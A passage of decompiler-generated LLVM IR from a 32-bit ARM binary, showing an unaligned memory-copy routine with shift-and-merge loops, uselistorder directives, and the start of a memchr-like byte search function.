  %v0_12354 = phi i32 [ %v0_12354.pre, %dec_label_pc_12350.dec_label_pc_12350_crit_edge ], [ %v1_122c0, %dec_label_pc_12348 ]
  %v0_12350 = phi i32 [ %v0_12350.pre, %dec_label_pc_12350.dec_label_pc_12350_crit_edge ], [ %v2_122c4, %dec_label_pc_12348 ]
  %v3_12350 = mul i32 %v0_12350, 65536
  store i32 %v3_12350, i32* %lr.global-to-local, align 4
  %v1_12354 = add i32 %v0_12354, -4
  %v2_12354 = inttoptr i32 %v1_12354 to i32*
  %v3_12354 = load i32, i32* %v2_12354, align 4
  store i32 %v3_12354, i32* %r3.global-to-local, align 4
  %v4_12354 = add i32 %v0_12354, -8
  %v5_12354 = inttoptr i32 %v4_12354 to i32*
  %v6_12354 = load i32, i32* %v5_12354, align 4
  store i32 %v6_12354, i32* %r4.global-to-local, align 4
  %v7_12354 = add i32 %v0_12354, -12
  %v8_12354 = inttoptr i32 %v7_12354 to i32*
  %v9_12354 = load i32, i32* %v8_12354, align 4
  store i32 %v9_12354, i32* %r5.global-to-local, align 4
  %v10_12354 = add i32 %v0_12354, -16
  %v11_12354 = inttoptr i32 %v10_12354 to i32*
  %v12_12354 = load i32, i32* %v11_12354, align 4
  store i32 %v10_12354, i32* %r1.global-to-local, align 4
  %v4_12358 = udiv i32 %v12_12354, 65536
  %v5_12358 = or i32 %v4_12358, %v3_12350
  store i32 %v5_12358, i32* %lr.global-to-local, align 4
  %v3_1235c = mul i32 %v12_12354, 65536
  %v4_12360 = udiv i32 %v9_12354, 65536
  %v5_12360 = or i32 %v3_1235c, %v4_12360
  store i32 %v5_12360, i32* @ip, align 4
  %v3_12364 = mul i32 %v9_12354, 65536
  %v4_12368 = udiv i32 %v6_12354, 65536
  %v5_12368 = or i32 %v3_12364, %v4_12368
  store i32 %v5_12368, i32* %r5.global-to-local, align 4
  %v3_1236c = mul i32 %v6_12354, 65536
  %v4_12370 = udiv i32 %v3_12354, 65536
  %v5_12370 = or i32 %v3_1236c, %v4_12370
  store i32 %v5_12370, i32* %r4.global-to-local, align 4
  %v1_12374 = add i32 %v0_12374, -16
  %v2_12374 = inttoptr i32 %v1_12374 to i32*
  store i32 %v5_12370, i32* %v2_12374, align 4
  %v4_12374 = add i32 %v0_12374, -12
  %v5_12374 = inttoptr i32 %v4_12374 to i32*
  %v6_12374 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_12374, i32* %v5_12374, align 4
  %v7_12374 = add i32 %v0_12374, -8
  %v8_12374 = inttoptr i32 %v7_12374 to i32*
  %v9_12374 = load i32, i32* @ip, align 4
  store i32 %v9_12374, i32* %v8_12374, align 4
  %v10_12374 = add i32 %v0_12374, -4
  %v11_12374 = inttoptr i32 %v10_12374 to i32*
  %v12_12374 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_12374, i32* %v11_12374, align 4
  store i32 %v1_12374, i32* %r0.global-to-local, align 4
  %v0_12378 = load i32, i32* %r2.global-to-local, align 4
  %v2_12378 = add i32 %v0_12378, -16
  store i32 %v2_12378, i32* %r2.global-to-local, align 4
  %v6_1237c = icmp slt i32 %v0_12378, 16
  br i1 %v6_1237c, label %dec_label_pc_12380, label %dec_label_pc_12350.dec_label_pc_12350_crit_edge

dec_label_pc_12350.dec_label_pc_12350_crit_edge:  ; preds = %dec_label_pc_12350
  %v0_12350.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_12354.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12350

dec_label_pc_12380:                               ; preds = %dec_label_pc_12350
  %v2_12380 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12380, i32* @r4, align 4
  %v5_12380 = load i8*, i8** %stack_var_-8, align 4
  %v6_12380 = ptrtoint i8* %v5_12380 to i32
  store i32 %v6_12380, i32* @r5, align 4
  store i32 %v11_1234c, i32* @lr, align 4
  %v2_12384 = add i32 %v0_12378, -4
  store i32 %v2_12384, i32* %r2.global-to-local, align 4
  %v4_12384 = add i32 %v0_12378, 2147483632
  %v5_12384 = and i32 %v2_12384, %v4_12384
  %v6_12384 = icmp slt i32 %v5_12384, 0
  store i1 %v6_12384, i1* %cpsr_v.global-to-local, align 1
  %v7_12384 = icmp slt i32 %v2_12384, 0
  store i1 %v7_12384, i1* %cpsr_n.global-to-local, align 1
  %v5_12388 = icmp slt i32 %v2_12378, -12
  br i1 %v5_12388, label %dec_label_pc_123a4, label %dec_label_pc_1238c

dec_label_pc_1238c:                               ; preds = %dec_label_pc_12380, %dec_label_pc_12340, %dec_label_pc_1238c
  %v1_12398 = phi i32 [ %v5_12398, %dec_label_pc_1238c ], [ %v1_12374, %dec_label_pc_12380 ], [ %v0_1230831, %dec_label_pc_12340 ]
  %v0_1238c = load i32, i32* %r3.global-to-local, align 4
  %v3_1238c = mul i32 %v0_1238c, 65536
  store i32 %v3_1238c, i32* %ip.global-to-local, align 4
  %v0_12390 = load i32, i32* %r1.global-to-local, align 4
  %v1_12390 = add i32 %v0_12390, -4
  %v2_12390 = inttoptr i32 %v1_12390 to i32*
  %v3_12390 = load i32, i32* %v2_12390, align 4
  store i32 %v3_12390, i32* %r3.global-to-local, align 4
  store i32 %v1_12390, i32* %r1.global-to-local, align 4
  %v4_12394 = udiv i32 %v3_12390, 65536
  %v5_12394 = or i32 %v4_12394, %v3_1238c
  store i32 %v5_12394, i32* @ip, align 4
  %v2_12398 = add i32 %v1_12398, -4
  %v3_12398 = inttoptr i32 %v2_12398 to i32*
  store i32 %v5_12394, i32* %v3_12398, align 4
  %v4_12398 = load i32, i32* %r0.global-to-local, align 4
  %v5_12398 = add i32 %v4_12398, -4
  store i32 %v5_12398, i32* %r0.global-to-local, align 4
  %v0_1239c = load i32, i32* %r2.global-to-local, align 4
  %v2_1239c = add i32 %v0_1239c, -4
  store i32 %v2_1239c, i32* %r2.global-to-local, align 4
  %v6_123a0 = icmp slt i32 %v0_1239c, 4
  br i1 %v6_123a0, label %dec_label_pc_123a4.loopexit, label %dec_label_pc_1238c

dec_label_pc_123a4.loopexit:                      ; preds = %dec_label_pc_1238c
  %v4_1239c = sub i32 3, %v0_1239c
  %v5_1239c = and i32 %v4_1239c, %v0_1239c
  %v6_1239c = icmp slt i32 %v5_1239c, 0
  %v7_1239c = icmp slt i32 %v2_1239c, 0
  store i1 %v6_1239c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1239c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_123a4

dec_label_pc_123a4:                               ; preds = %dec_label_pc_123a4.loopexit, %dec_label_pc_12380
  %v2_1227c64 = phi i32 [ %v5_12398, %dec_label_pc_123a4.loopexit ], [ %v1_12374, %dec_label_pc_12380 ]
  %v0_1226c60 = phi i32 [ %v2_1239c, %dec_label_pc_123a4.loopexit ], [ %v2_12384, %dec_label_pc_12380 ]
  %v0_123a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_123a4 = add i32 %v0_123a4, 2
  store i32 %v1_123a4, i32* @r1, align 4
  br label %bb143

dec_label_pc_123ac:                               ; preds = %dec_label_pc_122c0
  br i1 %v5_123b0, label %dec_label_pc_123f8, label %dec_label_pc_123b4

dec_label_pc_123b4:                               ; preds = %dec_label_pc_123ac
  store i32 %v2_123ac, i32* %r2.global-to-local, align 4
  %v3_123b8 = load i32, i32* @r4, align 4
  store i32 %v3_123b8, i32* %stack_var_-12, align 4
  %v6_123b8 = load i32, i32* @r5, align 4
  %v8_123b8 = inttoptr i32 %v6_123b8 to i8*
  store i8* %v8_123b8, i8** %stack_var_-8, align 4
  %v11_123b8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_123bc

dec_label_pc_123bc:                               ; preds = %dec_label_pc_123bc.dec_label_pc_123bc_crit_edge, %dec_label_pc_123b4
  %v0_123e0 = phi i32 [ %v1_123e0, %dec_label_pc_123bc.dec_label_pc_123bc_crit_edge ], [ %v0_1230831, %dec_label_pc_123b4 ]
  %v0_123c0 = phi i32 [ %v0_123c0.pre, %dec_label_pc_123bc.dec_label_pc_123bc_crit_edge ], [ %v1_122c0, %dec_label_pc_123b4 ]
  %v0_123bc = phi i32 [ %v0_123bc.pre, %dec_label_pc_123bc.dec_label_pc_123bc_crit_edge ], [ %v2_122c4, %dec_label_pc_123b4 ]
  %v3_123bc = mul i32 %v0_123bc, 16777216
  store i32 %v3_123bc, i32* %lr.global-to-local, align 4
  %v1_123c0 = add i32 %v0_123c0, -4
  %v2_123c0 = inttoptr i32 %v1_123c0 to i32*
  %v3_123c0 = load i32, i32* %v2_123c0, align 4
  store i32 %v3_123c0, i32* %r3.global-to-local, align 4
  %v4_123c0 = add i32 %v0_123c0, -8
  %v5_123c0 = inttoptr i32 %v4_123c0 to i32*
  %v6_123c0 = load i32, i32* %v5_123c0, align 4
  store i32 %v6_123c0, i32* %r4.global-to-local, align 4
  %v7_123c0 = add i32 %v0_123c0, -12
  %v8_123c0 = inttoptr i32 %v7_123c0 to i32*
  %v9_123c0 = load i32, i32* %v8_123c0, align 4
  store i32 %v9_123c0, i32* %r5.global-to-local, align 4
  %v10_123c0 = add i32 %v0_123c0, -16
  %v11_123c0 = inttoptr i32 %v10_123c0 to i32*
  %v12_123c0 = load i32, i32* %v11_123c0, align 4
  store i32 %v10_123c0, i32* %r1.global-to-local, align 4
  %v4_123c4 = udiv i32 %v12_123c0, 256
  %v5_123c4 = or i32 %v4_123c4, %v3_123bc
  store i32 %v5_123c4, i32* %lr.global-to-local, align 4
  %v3_123c8 = mul i32 %v12_123c0, 16777216
  %v4_123cc = udiv i32 %v9_123c0, 256
  %v5_123cc = or i32 %v3_123c8, %v4_123cc
  store i32 %v5_123cc, i32* @ip, align 4
  %v3_123d0 = mul i32 %v9_123c0, 16777216
  %v4_123d4 = udiv i32 %v6_123c0, 256
  %v5_123d4 = or i32 %v3_123d0, %v4_123d4
  store i32 %v5_123d4, i32* %r5.global-to-local, align 4
  %v3_123d8 = mul i32 %v6_123c0, 16777216
  %v4_123dc = udiv i32 %v3_123c0, 256
  %v5_123dc = or i32 %v3_123d8, %v4_123dc
  store i32 %v5_123dc, i32* %r4.global-to-local, align 4
  %v1_123e0 = add i32 %v0_123e0, -16
  %v2_123e0 = inttoptr i32 %v1_123e0 to i32*
  store i32 %v5_123dc, i32* %v2_123e0, align 4
  %v4_123e0 = add i32 %v0_123e0, -12
  %v5_123e0 = inttoptr i32 %v4_123e0 to i32*
  %v6_123e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_123e0, i32* %v5_123e0, align 4
  %v7_123e0 = add i32 %v0_123e0, -8
  %v8_123e0 = inttoptr i32 %v7_123e0 to i32*
  %v9_123e0 = load i32, i32* @ip, align 4
  store i32 %v9_123e0, i32* %v8_123e0, align 4
  %v10_123e0 = add i32 %v0_123e0, -4
  %v11_123e0 = inttoptr i32 %v10_123e0 to i32*
  %v12_123e0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_123e0, i32* %v11_123e0, align 4
  store i32 %v1_123e0, i32* %r0.global-to-local, align 4
  %v0_123e4 = load i32, i32* %r2.global-to-local, align 4
  %v2_123e4 = add i32 %v0_123e4, -16
  store i32 %v2_123e4, i32* %r2.global-to-local, align 4
  %v6_123e8 = icmp slt i32 %v0_123e4, 16
  br i1 %v6_123e8, label %dec_label_pc_123ec, label %dec_label_pc_123bc.dec_label_pc_123bc_crit_edge

dec_label_pc_123bc.dec_label_pc_123bc_crit_edge:  ; preds = %dec_label_pc_123bc
  %v0_123bc.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_123c0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_123bc

dec_label_pc_123ec:                               ; preds = %dec_label_pc_123bc
  %v2_123ec = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_123ec, i32* @r4, align 4
  %v5_123ec = load i8*, i8** %stack_var_-8, align 4
  %v6_123ec = ptrtoint i8* %v5_123ec to i32
  store i32 %v6_123ec, i32* @r5, align 4
  store i32 %v11_123b8, i32* @lr, align 4
  %v2_123f0 = add i32 %v0_123e4, -4
  store i32 %v2_123f0, i32* %r2.global-to-local, align 4
  %v4_123f0 = add i32 %v0_123e4, 2147483632
  %v5_123f0 = and i32 %v2_123f0, %v4_123f0
  %v6_123f0 = icmp slt i32 %v5_123f0, 0
  store i1 %v6_123f0, i1* %cpsr_v.global-to-local, align 1
  %v7_123f0 = icmp slt i32 %v2_123f0, 0
  store i1 %v7_123f0, i1* %cpsr_n.global-to-local, align 1
  %v5_123f4 = icmp slt i32 %v2_123e4, -12
  br i1 %v5_123f4, label %dec_label_pc_12410, label %dec_label_pc_123f8

dec_label_pc_123f8:                               ; preds = %dec_label_pc_123ec, %dec_label_pc_123ac, %dec_label_pc_123f8
  %v1_12404 = phi i32 [ %v5_12404, %dec_label_pc_123f8 ], [ %v1_123e0, %dec_label_pc_123ec ], [ %v0_1230831, %dec_label_pc_123ac ]
  %v0_123f8 = load i32, i32* %r3.global-to-local, align 4
  %v3_123f8 = mul i32 %v0_123f8, 16777216
  store i32 %v3_123f8, i32* %ip.global-to-local, align 4
  %v0_123fc = load i32, i32* %r1.global-to-local, align 4
  %v1_123fc = add i32 %v0_123fc, -4
  %v2_123fc = inttoptr i32 %v1_123fc to i32*
  %v3_123fc = load i32, i32* %v2_123fc, align 4
  store i32 %v3_123fc, i32* %r3.global-to-local, align 4
  store i32 %v1_123fc, i32* %r1.global-to-local, align 4
  %v4_12400 = udiv i32 %v3_123fc, 256
  %v5_12400 = or i32 %v4_12400, %v3_123f8
  store i32 %v5_12400, i32* @ip, align 4
  %v2_12404 = add i32 %v1_12404, -4
  %v3_12404 = inttoptr i32 %v2_12404 to i32*
  store i32 %v5_12400, i32* %v3_12404, align 4
  %v4_12404 = load i32, i32* %r0.global-to-local, align 4
  %v5_12404 = add i32 %v4_12404, -4
  store i32 %v5_12404, i32* %r0.global-to-local, align 4
  %v0_12408 = load i32, i32* %r2.global-to-local, align 4
  %v2_12408 = add i32 %v0_12408, -4
  store i32 %v2_12408, i32* %r2.global-to-local, align 4
  %v6_1240c = icmp slt i32 %v0_12408, 4
  br i1 %v6_1240c, label %dec_label_pc_12410.loopexit, label %dec_label_pc_123f8

dec_label_pc_12410.loopexit:                      ; preds = %dec_label_pc_123f8
  %v4_12408 = sub i32 3, %v0_12408
  %v5_12408 = and i32 %v4_12408, %v0_12408
  %v6_12408 = icmp slt i32 %v5_12408, 0
  %v7_12408 = icmp slt i32 %v2_12408, 0
  store i1 %v6_12408, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_12408, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_12410

dec_label_pc_12410:                               ; preds = %dec_label_pc_12410.loopexit, %dec_label_pc_123ec
  %v2_1227c65 = phi i32 [ %v5_12404, %dec_label_pc_12410.loopexit ], [ %v1_123e0, %dec_label_pc_123ec ]
  %v0_1226c61 = phi i32 [ %v2_12408, %dec_label_pc_12410.loopexit ], [ %v2_123f0, %dec_label_pc_123ec ]
  %v0_12410 = load i32, i32* %r1.global-to-local, align 4
  %v1_12410 = add i32 %v0_12410, 1
  store i32 %v1_12410, i32* @r1, align 4
  br label %bb143

; uselistorder directives
  uselistorder i32 %v5_12404, { 0, 2, 1 }
  uselistorder i32 %v3_123f8, { 1, 0 }
  uselistorder i32 %v2_123f0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_123e0, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_123c0, { 1, 0 }
  uselistorder i32 %v3_123bc, { 1, 0 }
  uselistorder i32 %v0_123c0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_123e0, { 3, 2, 1, 0 }
  uselistorder i32 %v5_12398, { 0, 2, 1 }
  uselistorder i32 %v3_1238c, { 1, 0 }
  uselistorder i32 %v2_12384, { 0, 2, 1, 3 }
  uselistorder i32 %v1_12374, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_12354, { 1, 0 }
  uselistorder i32 %v3_12350, { 1, 0 }
  uselistorder i32 %v0_12354, { 3, 2, 1, 0 }
  uselistorder i32 %v0_12374, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1232c, { 0, 2, 1 }
  uselistorder i32 %v3_12320, { 1, 0 }
  uselistorder i32 %v2_12318, { 0, 2, 1, 3 }
  uselistorder i32 %v1_12308, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_122e8, { 1, 0 }
  uselistorder i32 %v3_122e4, { 1, 0 }
  uselistorder i32 %v0_122e8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_12308, { 3, 2, 1, 0 }
  uselistorder i1 %v5_123b0, { 2, 0, 1 }
  uselistorder i32 %v0_122c8, { 1, 0 }
  uselistorder i32 %v0_123b4, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1230831, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_122b8, { 2, 1, 0 }
  uselistorder i32 %v0_122b8, { 2, 0, 1 }
  uselistorder i32 %v2_122b0, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_122b0, { 1, 0, 2 }
  uselistorder i32 %v0_122b0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1230832, { 2, 1, 0 }
  uselistorder i32 %v11_1228c, { 1, 0 }
  uselistorder i32 %v7_1228c, { 1, 0 }
  uselistorder i32 %v1_1226c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_1226c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_12270, { 1, 0 }
  uselistorder i32 %v7_12264, { 0, 2, 1 }
  uselistorder i32 %v10_12260, { 1, 0 }
  uselistorder i32 %v9_12258, { 1, 0, 2 }
  uselistorder i32 %v6_12254, { 1, 0 }
  uselistorder i32 %v2_1224c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1224c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1225c, { 0, 3, 2, 1 }
  uselistorder i32 %v7_12240, { 0, 2, 1 }
  uselistorder i32 %v13_1223c, { 1, 0 }
  uselistorder i32 %v4_12238, { 0, 2, 1, 3 }
  uselistorder i32 %v0_12238, { 2, 0, 1 }
  uselistorder i32 %v6_12240, { 0, 3, 2, 1 }
  uselistorder i32 %v7_12230, { 0, 2, 1 }
  uselistorder i32 %v16_1222c, { 1, 0 }
  uselistorder i32 %v4_12228, { 1, 0 }
  uselistorder i32 %v0_12238.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_12230, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_1221c, { 0, 3, 2, 1 }
  uselistorder i32 %v10_12218, { 1, 0 }
  uselistorder i32 %v1_12214, { 1, 0 }
  uselistorder i32 %v10_12210, { 1, 0 }
  uselistorder i32 %v0_12210, { 3, 2, 1, 0 }
  uselistorder i32 %v0_12214, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_12208, { 0, 2, 1 }
  uselistorder i32 %v2_121fc, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_121fc, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_1221449, { 1, 2, 0 }
  uselistorder i32 %v1_121f4, { 2, 1, 0 }
  uselistorder i32 %v1_121ec, { 2, 3, 1, 0 }
  uselistorder i32 %v2_121e4, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_121e0, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_121dc, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_121dc, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_121c8, { 0, 2, 1 }
  uselistorder i32 %v3_121bc, { 1, 0 }
  uselistorder i32 %v2_121b4, { 0, 2, 1, 3 }
  uselistorder i32 %v12_121a4, { 1, 0, 3, 2 }
  uselistorder i32 %v8_12184, { 1, 0, 2 }
  uselistorder i32 %v5_12184, { 1, 0, 2 }
  uselistorder i32 %v2_12184, { 1, 0, 2 }
  uselistorder i32 %v3_12180, { 1, 0 }
  uselistorder i32 %v0_12184, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_121a4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_1215c, { 0, 2, 1 }
  uselistorder i32 %v3_12150, { 1, 0 }
  uselistorder i32 %v2_12148, { 0, 2, 1, 3 }
  uselistorder i32 %v12_12138, { 1, 0, 3, 2 }
  uselistorder i32 %v8_12118, { 1, 0, 2 }
  uselistorder i32 %v5_12118, { 1, 0, 2 }
  uselistorder i32 %v2_12118, { 1, 0, 2 }
  uselistorder i32 %v3_12114, { 1, 0 }
  uselistorder i32 %v0_12118, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12138, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_120f0, { 0, 2, 1 }
  uselistorder i32 %v3_120e4, { 1, 0 }
  uselistorder i32 %v2_120dc, { 0, 2, 1, 3 }
  uselistorder i32 %v12_120cc, { 1, 0, 3, 2 }
  uselistorder i32 %v8_120ac, { 1, 0, 2 }
  uselistorder i32 %v5_120ac, { 1, 0, 2 }
  uselistorder i32 %v2_120ac, { 1, 0, 2 }
  uselistorder i32 %v3_120a8, { 1, 0 }
  uselistorder i32 %v0_120ac, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_120cc, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_12174, { 2, 0, 1 }
  uselistorder i32 %v0_12178, { 3, 0, 2, 1 }
  uselistorder i32 %v0_120cc75, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_1207c, { 1, 0 }
  uselistorder i32 %v0_1207c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_12074, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_12074, { 1, 0, 2 }
  uselistorder i32 %v0_12074, { 2, 0, 1, 3 }
  uselistorder i32 %v0_120cc76, { 2, 1, 0 }
  uselistorder i32 %v1_12054, { 1, 0, 2 }
  uselistorder i32 %v1_1202c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_1202c, { 1, 2, 0, 3 }
  uselistorder i32 %v8_12018, { 1, 0, 2 }
  uselistorder i32 %v6_12014, { 1, 0 }
  uselistorder i32 %v2_1200c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1200c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1201c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_12004, { 0, 2, 1 }
  uselistorder i1 %v0_12004, { 1, 0 }
  uselistorder i1 %v1_12004, { 1, 0 }
  uselistorder i32 %v3_12000, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_11ff8, { 0, 2, 1, 3 }
  uselistorder i32 %v4_11fe4, { 1, 0 }
  uselistorder i32 %v12_11fd8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_11fcc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11fd0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_11fc0, { 0, 2, 1 }
  uselistorder i32 %v2_11fb8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_11fb8, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_11fb0, { 1, 0 }
  uselistorder i32 %v1_11fa8, { 2, 1, 0 }
  uselistorder i32 %v2_11fa0, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_11fa0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_11f90, { 1, 0 }
  uselistorder i32 %v1_11f90, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_11f90, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 16, 17, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 25, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i32* %r2.global-to-local, { 0, 60, 1, 2, 3, 4, 5, 61, 6, 7, 8, 9, 10, 62, 11, 12, 13, 14, 15, 63, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 64, 65, 66, 67, 69, 68, 30, 31, 56, 32, 33, 34, 35, 36, 57, 37, 38, 39, 40, 41, 58, 42, 44, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 59 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 12, 1, 3, 6, 4, 13, 5, 7, 10, 8, 14, 9, 11, 15, 16, 17, 35, 36, 34, 18, 19, 22, 20, 28, 21, 23, 26, 24, 29, 25, 27, 30, 31, 32, 33 }
  uselistorder i32* %r0.global-to-local, { 3, 50, 4, 5, 51, 6, 7, 52, 8, 9, 10, 11, 12, 13, 53, 14, 16, 15, 17, 18, 54, 19, 20, 55, 21, 22, 23, 24, 56, 57, 59, 60, 25, 32, 26, 27, 33, 28, 29, 30, 31, 34, 35, 0, 36, 37, 39, 38, 40, 41, 58, 42, 43, 44, 47, 45, 46, 48, 49, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 13, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 41, 0, 42, 1, 24, 2, 25, 23, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1* %cpsr_n.global-to-local, { 5, 7, 6, 9, 0, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 22, 23, 45, 46, 47, 1, 48, 2, 25, 3, 26, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_123f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1238c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12320, { 2, 0, 1 }
  uselistorder label %dec_label_pc_122c0, { 1, 0 }
  uselistorder label %.thread26, { 2, 0, 1 }
  uselistorder label %.thread122, { 1, 0 }
  uselistorder label %bb143, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_1224c, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_12210, { 1, 0 }
  uselistorder label %dec_label_pc_121fc, { 1, 0 }
  uselistorder label %dec_label_pc_121bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12150, { 2, 0, 1 }
  uselistorder label %dec_label_pc_120e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12084, { 1, 0 }
  uselistorder label %.thread12, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %bb133, { 6, 4, 5, 1, 7, 0, 2, 3 }
  uselistorder label %.thread118, { 1, 0 }
  uselistorder label %dec_label_pc_11ff8, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_11fb8, { 1, 0 }
}

define i32 @function_12418(i32 %arg1) local_unnamed_addr {
dec_label_pc_12418:
  ret i32 %arg1
}

define i32 @function_12420(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12420:
  %v0_12420 = load i32, i32* @r0, align 4
  %v1_12420 = load i32, i32* @r1, align 4
  %v2_12420 = inttoptr i32 %v0_12420 to i8*
  %v3_12420 = call i32 @function_11f90(i8* %v2_12420, i32 %v1_12420)
  ret i32 %v3_12420

; uselistorder directives
  uselistorder i32 (i8*, i32)* @function_11f90, { 1, 2, 0 }
}

define i32 @function_12430(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12430:
  %v3_12430 = load i32, i32* @r4, align 4
  %v6_12430 = load i32, i32* @r5, align 4
  %v9_12430 = load i32, i32* @r6, align 4
  %v1_12434 = urem i32 %arg1, 256
  %v0_1245018 = load i32, i32* @r2, align 4
  %v2_1245020 = icmp eq i32 %v0_1245018, 0
  br i1 %v2_1245020, label %dec_label_pc_12460, label %dec_label_pc_12458

dec_label_pc_1243c:                               ; preds = %dec_label_pc_12458
  %v3_1243c = load i8, i8* %.021, align 1
  %v4_1243c = zext i8 %v3_1243c to i32
  %v9_12440 = icmp eq i32 %v4_1243c, %v1_12434
  %v1_12444 = add i32 %v0_12444, -1
  br i1 %v9_12440, label %bb, label %dec_label_pc_12450

bb:                                               ; preds = %dec_label_pc_1243c
  ret i32 %v1_12458

dec_label_pc_12450:                               ; preds = %dec_label_pc_1243c
  %v2_1244c = add i32 %v1_12458, 1
  %v3_1244c = inttoptr i32 %v2_1244c to i8*
  %v2_12450 = icmp eq i32 %v1_12444, 0
  br i1 %v2_12450, label %dec_label_pc_12460, label %dec_label_pc_12458

